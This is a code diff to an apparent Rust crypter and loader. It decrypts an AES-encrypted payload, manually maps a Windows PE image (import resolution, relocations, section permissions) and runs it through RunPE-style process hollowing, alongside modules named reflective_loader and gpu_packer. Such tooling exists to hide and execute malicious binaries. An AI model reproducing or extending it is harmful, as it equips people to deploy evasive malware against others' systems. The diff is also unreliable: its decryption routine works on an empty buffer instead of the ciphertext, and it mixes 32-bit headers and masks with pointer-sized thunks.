@@ -4,6 +4,39 @@ use std::fs;
 use anyhow::{Result, Context};
 use log::{info, warn, error};
 
+#[cfg(target_os = "windows")]
+use std::mem::size_of;
+
+#[cfg(target_os = "windows")]
+use aes::Aes256;
+#[cfg(target_os = "windows")]
+use cbc::{Decryptor, cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7}};
+
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::SystemServices::{
+    IMAGE_IMPORT_DESCRIPTOR, IMAGE_IMPORT_BY_NAME, IMAGE_BASE_RELOCATION,
+};
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    IMAGE_OPTIONAL_HEADER32, IMAGE_SECTION_HEADER,
+    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC,
+    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE,
+};
+
+#[cfg(target_os = "windows")]
+const IMAGE_REL_BASED_ABSOLUTE: u32 = 0;
+#[cfg(target_os = "windows")]
+const IMAGE_REL_BASED_HIGHLOW: u32 = 3;
+#[cfg(target_os = "windows")]
+const IMAGE_REL_BASED_DIR64: u32 = 10;
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Memory::{
+    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ,
+    PAGE_READWRITE, PAGE_READONLY,
+};
+
 mod protection;
 mod gpu_packer;
 mod reflective_loader;
@@ -93,6 +126,8 @@ fn main() -> Result<(), anyhow::Error> {
                         target_path: target_path.to_string_lossy().to_string(),
                         arguments: args.args,
                         auto_resume: !args.no_auto_resume,
+                        memory_strategy: runpe::MemoryAllocationStrategy::Standard,
+                        section_strategy: runpe::SectionMappingStrategy::Standard,
                     };
                     
                     let input_path = args.input.clone();
@@ -184,13 +219,15 @@ fn decrypt_aes256_cbc(
     }
     let cipher = Decryptor::<Aes256>::new_from_slices(key, iv)
         .map_err(|_| "new_from_slices failed (invalid key/iv?)".to_string())?;
+    let mut buffer = vec![0u8; ciphertext.len()];
     cipher
-        .decrypt_padded_vec_mut::<Pkcs7>(ciphertext)
+        .decrypt_padded_mut::<Pkcs7>(&mut buffer)
         .map_err(|e| format!("AES-256-CBC decryption failed: {:?}", e))
+        .map(|decrypted| decrypted.to_vec())
 }
 
 #[cfg(target_os = "windows")]
-fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER64) -> Result<(), String> {
+fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER32) -> Result<(), String> {
     let import_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
     let import_desc_ptr = (image_base + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;
 
@@ -210,10 +247,10 @@ fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER64) -> R
                 return Err(format!("Failed to load library: {}", dll_name));
             }
 
-            let mut oft_ptr = (image_base + desc.OriginalFirstThunk as usize) as *const usize;
+            let mut oft_ptr = (image_base + desc.Anonymous.OriginalFirstThunk as usize) as *const usize;
             let mut ft_ptr  = (image_base + desc.FirstThunk as usize) as *mut usize;
 
-            if desc.OriginalFirstThunk == 0 {
+            if desc.Anonymous.OriginalFirstThunk == 0 {
                 oft_ptr = ft_ptr as *const usize;
             }
 
@@ -226,7 +263,7 @@ fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER64) -> R
 
                 let func_addr: usize;
 
-                if (lookup_val & 0x8000000000000000) != 0 {
+                if (lookup_val & 0x80000000) != 0 {
                     let ordinal = (lookup_val & 0xFFFF) as u16;
                     let proc_opt = GetProcAddress(dll_handle, ordinal as *const u8);
                     if let Some(fn_ptr) = proc_opt {
@@ -260,7 +297,7 @@ fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER64) -> R
 fn apply_relocations(
     image_base: usize,
     preferred_base: usize,
-    opt_header: &IMAGE_OPTIONAL_HEADER64
+    opt_header: &IMAGE_OPTIONAL_HEADER32
 ) -> Result<(), String> {
     let base_reloc_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
     let reloc_va  = base_reloc_dir.VirtualAddress as usize;
@@ -312,7 +349,7 @@ fn apply_relocations(
 fn set_section_permissions(
     image_base: usize,
     sections: &[IMAGE_SECTION_HEADER],
-    opt_header: &IMAGE_OPTIONAL_HEADER64,
+    opt_header: &IMAGE_OPTIONAL_HEADER32,
 ) -> Result<(), String> {
     unsafe {
         for sect in sections {
